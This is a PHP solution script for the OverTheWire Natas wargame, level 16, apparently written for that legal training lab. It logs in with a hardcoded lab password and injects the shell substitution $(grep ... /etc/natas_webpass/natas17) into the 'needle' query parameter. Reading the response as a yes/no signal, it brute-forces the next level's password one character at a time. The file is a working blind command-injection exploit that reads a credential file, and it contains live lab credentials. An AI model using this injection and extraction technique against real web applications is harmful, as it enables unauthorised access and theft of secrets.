<?php

# Global vars
$chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
$chars_length = strlen($chars);

$filtered = "";
$final_pass = "";

# Connect to natas16 using PHP curl library
$handle = curl_init();

# Define connection params
$username = "natas16";
$password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh";

# Loop chars
echo "Checking chars in password ...\n";
for ($i = 0; $i < $chars_length; $i++) {

    # Set the connection to natas16
    curl_setopt_array($handle,
        array(
            CURLOPT_URL               => 'http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep%20'. $chars[$i] .'%20/etc/natas_webpass/natas17)',
            CURLOPT_HTTPAUTH          => CURLAUTH_ANY,
            CURLOPT_USERPWD           => "$username:$password",
            CURLOPT_RETURNTRANSFER    => true
        )
    );

    # Run post
    $server_output = curl_exec($handle);

    # If char is not in password string ...
    if (stripos($server_output, "doomed") === false) {
        $filtered = $filtered . $chars[$i];
    }

}

# Show filtered chars
echo "Characters filtered: ". $filtered . "\n";

# Brute force to get password
echo "Using brute force to get final password ...\n";
$filtered_length = strlen($filtered);
for ($i = 0; $i < 32; $i++) {
    for ($j = 0; $j < $filtered_length; $j++) {

        # Set the connection to natas15
        curl_setopt_array($handle,
            array(
                CURLOPT_URL               => 'http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep%20^' . $final_pass . $filtered[$j] . '%20/etc/natas_webpass/natas17)',
                CURLOPT_HTTPAUTH          => CURLAUTH_ANY,
                CURLOPT_USERPWD           => "$username:$password",
                CURLOPT_RETURNTRANSFER    => true
            )
        );

        # Run post
        $server_output = curl_exec($handle);

        # If char is not in password string ...
        if (stripos($server_output, "doomed") === false) {
            $final_pass = $final_pass . $filtered[$j];
            echo $final_pass . "\n";
            break;
        }

    }
}

echo "Password: " . $final_pass . "\n";

# Close connection
curl_close($handle);